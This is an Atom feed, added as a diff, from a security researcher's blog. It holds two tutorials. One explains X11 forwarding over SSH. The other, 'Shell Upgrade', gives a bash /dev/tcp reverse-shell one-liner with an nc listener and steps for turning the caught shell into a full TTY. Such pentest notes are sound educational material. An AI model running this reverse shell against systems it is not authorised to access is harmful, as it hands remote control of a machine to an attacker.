@@ -1,0 +1,124 @@
+<?xml version="1.0" encoding="UTF-8"?>
+<feed xmlns="http://www.w3.org/2005/Atom" xml:lang="en">
+    <title>nu1lptr - Tutorial</title>
+    <subtitle>Learner &#x2F;&#x2F; Cybersecurity Ph.D.@UMich CSE &#x2F;&#x2F; Photographer</subtitle>
+    <link rel="self" type="application/atom+xml" href="https://shengtuo.me/tags/tutorial/atom.xml"/>
+    <link rel="alternate" type="text/html" href="https://shengtuo.me"/>
+    <generator uri="https://www.getzola.org/">Zola</generator>
+    <updated>2025-10-05T21:48:00-07:00</updated>
+    <id>https://shengtuo.me/tags/tutorial/atom.xml</id>
+    <entry xml:lang="en">
+        <title>X11 Forwarding over SSH</title>
+        <published>2025-10-05T21:48:00-07:00</published>
+        <updated>2025-10-05T21:48:00-07:00</updated>
+        
+        <author>
+          <name>
+            Shengtuo Hu
+          </name>
+        </author>
+        
+        <link rel="alternate" type="text/html" href="https://shengtuo.me/blog/ssh-x11-forwarding/"/>
+        <id>https://shengtuo.me/blog/ssh-x11-forwarding/</id>
+        
+        <content type="html" xml:base="https://shengtuo.me/blog/ssh-x11-forwarding/">&lt;p&gt;I am debugging a GUI application, running on my remote Linux machine, and want to stay in my macOS development environment. This tutorial briefly goes through SSH configurations on both sides (Linux, macOS) for X11 forwarding.&lt;&#x2F;p&gt;
+&lt;h2 id=&quot;linux-setup&quot;&gt;&lt;a class=&quot;zola-anchor&quot; href=&quot;#linux-setup&quot; aria-label=&quot;Anchor link for: linux-setup&quot;&gt;&lt;i class=&quot;icon&quot;&gt;&lt;&#x2F;i&gt;&lt;&#x2F;a&gt;
+Linux Setup&lt;&#x2F;h2&gt;
+&lt;p&gt;Of course, please ensure we have SSH server installed on the Linux machine at first.&lt;&#x2F;p&gt;
+&lt;pre data-lang=&quot;bash&quot; style=&quot;background-color:#31333d;color:#ffffffc4;&quot; class=&quot;language-bash &quot;&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;&lt;span style=&quot;font-weight:bold;color:#a3cbe3;&quot;&gt;sudo&lt;&#x2F;span&gt;&lt;span&gt; apt install openssh-server
+&lt;&#x2F;span&gt;&lt;span&gt;
+&lt;&#x2F;span&gt;&lt;span style=&quot;color:#707180;&quot;&gt;# Check its status
+&lt;&#x2F;span&gt;&lt;span style=&quot;font-weight:bold;color:#a3cbe3;&quot;&gt;sudo&lt;&#x2F;span&gt;&lt;span&gt; systemctl status ssh
+&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
+&lt;p&gt;Then, edit &lt;code&gt;&#x2F;etc&#x2F;ssh&#x2F;sshd_config&lt;&#x2F;code&gt; to at least enable the following entries:&lt;&#x2F;p&gt;
+&lt;pre data-lang=&quot;txt&quot; data-name=&quot;&#x2F;etc&#x2F;ssh&#x2F;sshd_config&quot; style=&quot;background-color:#31333d;color:#ffffffc4;&quot; class=&quot;language-txt &quot;&gt;&lt;code class=&quot;language-txt&quot; data-lang=&quot;txt&quot; data-name=&quot;&#x2F;etc&#x2F;ssh&#x2F;sshd_config&quot;&gt;&lt;span&gt;AllowTcpForwarding yes
+&lt;&#x2F;span&gt;&lt;span&gt;X11Forwarding yes
+&lt;&#x2F;span&gt;&lt;span&gt;X11DisplayOffset 10
+&lt;&#x2F;span&gt;&lt;span&gt;X11UseLocalhost yes
+&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
+&lt;p&gt;After that, restart &lt;code&gt;sshd&lt;&#x2F;code&gt; service to apply our configuration changes.&lt;&#x2F;p&gt;
+&lt;pre data-lang=&quot;bash&quot; style=&quot;background-color:#31333d;color:#ffffffc4;&quot; class=&quot;language-bash &quot;&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;&lt;span style=&quot;font-weight:bold;color:#a3cbe3;&quot;&gt;sudo&lt;&#x2F;span&gt;&lt;span&gt; systemctl restart ssh
+&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
+&lt;h2 id=&quot;macos-setup&quot;&gt;&lt;a class=&quot;zola-anchor&quot; href=&quot;#macos-setup&quot; aria-label=&quot;Anchor link for: macos-setup&quot;&gt;&lt;i class=&quot;icon&quot;&gt;&lt;&#x2F;i&gt;&lt;&#x2F;a&gt;
+macOS Setup&lt;&#x2F;h2&gt;
+&lt;p&gt;On the other side, we need to install &lt;a rel=&quot;noopener&quot; target=&quot;_blank&quot; href=&quot;https:&#x2F;&#x2F;www.xquartz.org&#x2F;&quot;&gt;XQuartz&lt;&#x2F;a&gt;, an open-source X11 server for macOS. Note that, we have to log out and login again to enable xquartz after the installation.&lt;&#x2F;p&gt;
+&lt;pre data-lang=&quot;bash&quot; style=&quot;background-color:#31333d;color:#ffffffc4;&quot; class=&quot;language-bash &quot;&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;&lt;span style=&quot;font-weight:bold;color:#a3cbe3;&quot;&gt;brew&lt;&#x2F;span&gt;&lt;span&gt; install&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ffffff;&quot;&gt; --cask&lt;&#x2F;span&gt;&lt;span&gt; xquartz
+&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
+&lt;p&gt;Now, we can connect to the remote Linux machine via SSH.&lt;&#x2F;p&gt;
+&lt;pre data-lang=&quot;bash&quot; style=&quot;background-color:#31333d;color:#ffffffc4;&quot; class=&quot;language-bash &quot;&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;&lt;span style=&quot;font-weight:bold;color:#a3cbe3;&quot;&gt;ssh&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ffffff;&quot;&gt; -X&lt;&#x2F;span&gt;&lt;span&gt; foo@your.host.ip.addr
+&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
+&lt;p&gt;Usually, I would prefer saving the host and options in &lt;code&gt;~&#x2F;.ssh&#x2F;config&lt;&#x2F;code&gt; as shown below:&lt;&#x2F;p&gt;
+&lt;pre data-lang=&quot;txt&quot; data-name=&quot;~&#x2F;.ssh&#x2F;config&quot; style=&quot;background-color:#31333d;color:#ffffffc4;&quot; class=&quot;language-txt &quot;&gt;&lt;code class=&quot;language-txt&quot; data-lang=&quot;txt&quot; data-name=&quot;~&#x2F;.ssh&#x2F;config&quot;&gt;&lt;span&gt;Host your-host-name*
+&lt;&#x2F;span&gt;&lt;span&gt;    HostName your.host.ip.addr
+&lt;&#x2F;span&gt;&lt;span&gt;    User foo
+&lt;&#x2F;span&gt;&lt;span&gt;    Port 22
+&lt;&#x2F;span&gt;&lt;span&gt;    IdentityFile ~&#x2F;.ssh&#x2F;id_rsa
+&lt;&#x2F;span&gt;&lt;span&gt;
+&lt;&#x2F;span&gt;&lt;span&gt;Host your-host-name
+&lt;&#x2F;span&gt;&lt;span&gt;    ForwardX11 no
+&lt;&#x2F;span&gt;&lt;span&gt;
+&lt;&#x2F;span&gt;&lt;span&gt;Host your-host-name-x11
+&lt;&#x2F;span&gt;&lt;span&gt;    ForwardX11 yes
+&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
+&lt;p&gt;I do not want X11 forwarding everytime, so I add two host entries. The second entry with &lt;code&gt;-x11&lt;&#x2F;code&gt; suffix has the X11 forwarding option, while the first one does not. Now, we can simply use &lt;code&gt;ssh your-host-name-x11&lt;&#x2F;code&gt; to connect the remote machine. If X11 is not needed, we can use &lt;code&gt;ssh your-host-name&lt;&#x2F;code&gt;.&lt;&#x2F;p&gt;
+&lt;h2 id=&quot;reference&quot;&gt;&lt;a class=&quot;zola-anchor&quot; href=&quot;#reference&quot; aria-label=&quot;Anchor link for: reference&quot;&gt;&lt;i class=&quot;icon&quot;&gt;&lt;&#x2F;i&gt;&lt;&#x2F;a&gt;
+Reference&lt;&#x2F;h2&gt;
+&lt;ul&gt;
+&lt;li&gt;&lt;a rel=&quot;noopener&quot; target=&quot;_blank&quot; href=&quot;https:&#x2F;&#x2F;some-natalie.dev&#x2F;blog&#x2F;ssh-x11-forwarding&#x2F;&quot;&gt;A quick and dirty guide to X11 forwarding over SSH&lt;&#x2F;a&gt;&lt;&#x2F;li&gt;
+&lt;&#x2F;ul&gt;
+</content>
+        
+    </entry>
+    <entry xml:lang="en">
+        <title>Shell Upgrade</title>
+        <published>2025-08-15T15:24:53-07:00</published>
+        <updated>2025-08-15T15:24:53-07:00</updated>
+        
+        <author>
+          <name>
+            Shengtuo Hu
+          </name>
+        </author>
+        
+        <link rel="alternate" type="text/html" href="https://shengtuo.me/blog/shell-upgrade/"/>
+        <id>https://shengtuo.me/blog/shell-upgrade/</id>
+        
+        <content type="html" xml:base="https://shengtuo.me/blog/shell-upgrade/">&lt;h2 id=&quot;reverse-shell&quot;&gt;&lt;a class=&quot;zola-anchor&quot; href=&quot;#reverse-shell&quot; aria-label=&quot;Anchor link for: reverse-shell&quot;&gt;&lt;i class=&quot;icon&quot;&gt;&lt;&#x2F;i&gt;&lt;&#x2F;a&gt;
+Reverse Shell&lt;&#x2F;h2&gt;
+&lt;p&gt;A reverse shell is initiated from a remote machine and forward to our local port, so we can interact with the remote machine.&lt;&#x2F;p&gt;
+&lt;pre data-lang=&quot;bash&quot; style=&quot;background-color:#31333d;color:#ffffffc4;&quot; class=&quot;language-bash &quot;&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;&lt;span style=&quot;color:#707180;&quot;&gt;# myip: ip address of the local machine
+&lt;&#x2F;span&gt;&lt;span style=&quot;color:#707180;&quot;&gt;# myport: local port
+&lt;&#x2F;span&gt;&lt;span&gt;
+&lt;&#x2F;span&gt;&lt;span style=&quot;color:#707180;&quot;&gt;# On the local machine
+&lt;&#x2F;span&gt;&lt;span style=&quot;font-weight:bold;color:#a3cbe3;&quot;&gt;nc&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ffffff;&quot;&gt; -lnvp &lt;&#x2F;span&gt;&lt;span style=&quot;font-weight:bold;color:#dbbb3d;&quot;&gt;$&lt;&#x2F;span&gt;&lt;span style=&quot;font-weight:bold;color:#a3cbe3;&quot;&gt;myport
+&lt;&#x2F;span&gt;&lt;span style=&quot;color:#707180;&quot;&gt;# Waiting for the connection
+&lt;&#x2F;span&gt;&lt;span&gt;
+&lt;&#x2F;span&gt;&lt;span style=&quot;color:#707180;&quot;&gt;# On the remote machine
+&lt;&#x2F;span&gt;&lt;span style=&quot;font-weight:bold;color:#a3cbe3;&quot;&gt;bash&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ffffff;&quot;&gt; -i &lt;&#x2F;span&gt;&lt;span style=&quot;color:#db7c6d;&quot;&gt;&amp;gt;&amp;amp;&lt;&#x2F;span&gt;&lt;span&gt; &#x2F;dev&#x2F;tcp&#x2F;&lt;&#x2F;span&gt;&lt;span style=&quot;font-weight:bold;color:#dbbb3d;&quot;&gt;$&lt;&#x2F;span&gt;&lt;span style=&quot;font-weight:bold;color:#a3cbe3;&quot;&gt;myip&lt;&#x2F;span&gt;&lt;span&gt;&#x2F;&lt;&#x2F;span&gt;&lt;span style=&quot;font-weight:bold;color:#dbbb3d;&quot;&gt;$&lt;&#x2F;span&gt;&lt;span style=&quot;font-weight:bold;color:#a3cbe3;&quot;&gt;myport &lt;&#x2F;span&gt;&lt;span style=&quot;color:#db7c6d;&quot;&gt;0&amp;gt;&amp;amp;1
+&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
+&lt;h2 id=&quot;shell-upgrade&quot;&gt;&lt;a class=&quot;zola-anchor&quot; href=&quot;#shell-upgrade&quot; aria-label=&quot;Anchor link for: shell-upgrade&quot;&gt;&lt;i class=&quot;icon&quot;&gt;&lt;&#x2F;i&gt;&lt;&#x2F;a&gt;
+Shell Upgrade&lt;&#x2F;h2&gt;
+&lt;p&gt;After setting up the reverse shell, run the following commands in the reverse shell to get a TTY.&lt;&#x2F;p&gt;
+&lt;pre data-lang=&quot;bash&quot; style=&quot;background-color:#31333d;color:#ffffffc4;&quot; class=&quot;language-bash &quot;&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;&lt;span style=&quot;color:#707180;&quot;&gt;# Get a TTY
+&lt;&#x2F;span&gt;&lt;span style=&quot;font-weight:bold;color:#a3cbe3;&quot;&gt;script&lt;&#x2F;span&gt;&lt;span&gt; &#x2F;dev&#x2F;null&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ffffff;&quot;&gt; -c&lt;&#x2F;span&gt;&lt;span&gt; bash
+&lt;&#x2F;span&gt;&lt;span&gt;
+&lt;&#x2F;span&gt;&lt;span style=&quot;color:#707180;&quot;&gt;# Hit ^Z to send the local `nc` process to the background
+&lt;&#x2F;span&gt;&lt;span style=&quot;color:#707180;&quot;&gt;# Disable &amp;quot;echo&amp;quot; for the local TTY and bring back `nc` process
+&lt;&#x2F;span&gt;&lt;span style=&quot;font-weight:bold;color:#a3cbe3;&quot;&gt;stty&lt;&#x2F;span&gt;&lt;span&gt; raw&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ffffff;&quot;&gt; -echo&lt;&#x2F;span&gt;&lt;span style=&quot;color:#db7c6d;&quot;&gt;; fg
+&lt;&#x2F;span&gt;&lt;span&gt;
+&lt;&#x2F;span&gt;&lt;span style=&quot;color:#707180;&quot;&gt;# Reset the remote shell
+&lt;&#x2F;span&gt;&lt;span style=&quot;font-weight:bold;color:#a3cbe3;&quot;&gt;reset
+&lt;&#x2F;span&gt;&lt;span style=&quot;color:#707180;&quot;&gt;# Note that, you won&amp;#39;t see anything now, but remember to type in &amp;quot;screen&amp;quot;
+&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
+&lt;h2 id=&quot;references&quot;&gt;&lt;a class=&quot;zola-anchor&quot; href=&quot;#references&quot; aria-label=&quot;Anchor link for: references&quot;&gt;&lt;i class=&quot;icon&quot;&gt;&lt;&#x2F;i&gt;&lt;&#x2F;a&gt;
+References&lt;&#x2F;h2&gt;
+&lt;iframe
+	class=&quot;youtube-embed&quot;
+	src=&quot;https:&#x2F;&#x2F;www.youtube-nocookie.com&#x2F;embed&#x2F;DqE6DxqJg8Q&quot;
+	allow=&quot;accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture; web-share&quot;
+	referrerpolicy=&quot;strict-origin-when-cross-origin&quot; allowfullscreen&gt;
+&lt;&#x2F;iframe&gt;
+</content>
+        
+    </entry>
+</feed>
